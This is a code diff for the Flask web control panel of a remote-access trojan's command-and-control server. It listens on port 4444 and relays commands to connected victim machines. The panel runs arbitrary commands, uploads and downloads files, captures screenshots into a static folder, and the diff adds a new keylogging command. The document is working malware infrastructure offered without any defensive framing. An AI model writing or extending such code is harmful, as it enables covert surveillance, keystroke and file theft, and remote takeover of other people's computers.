@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import socket
 import threading
 import flask
@@ -7,11 +9,13 @@ import string
 import random
 import time
 import os
+import multiprocessing
 
 host = "127.0.0.1"
 port = 4444
 clients = []
 addrs = []
+keys = []
 app = Flask(__name__)
 picFolder = os.path.join("static","pics")
 app.config["UPLOAD_FOLDER"] = picFolder
@@ -87,25 +91,28 @@ def session(i):
 def executecmd(i):
     output = ""
     imgName = ""
+    client = clients[int(i)]
     cmd = request.form["cmd"]
-    reliable_send(clients[int(i)],cmd)
+    reliable_send(client,cmd)
     if cmd[:6] == "upload":
         fileName = cmd.split(" ")[1]
-        upload(clients[int(i)],fileName)
+        upload(client,fileName)
         output = "Upload {}".format(fileName)
     elif cmd[:8] == "download":
         fileName = cmd.split(" ")[2]
-        download(clients[int(i)],fileName)
+        download(client,fileName)
         output = "Download {}".format(fileName)
+    elif cmd == "keylog":
+        output = "Keylog start"
     elif cmd == "screenshot":
         nameRandom = randomName()
         imgName = os.path.join(app.config["UPLOAD_FOLDER"],nameRandom)
-        download(clients[int(i)],imgName)
+        download(client,imgName)
         time.sleep(2)
     elif cmd[:2] == "cd" and len(cmd) > 3:
             output = "Changed directory to {}".format(cmd[3:])
     else:
-        output = reliable_recv(clients[int(i)])
+        output = reliable_recv(client)
     return render_template("execute.html",output=output,i=i,imgLink=imgName)
 
 if __name__ == "__main__":
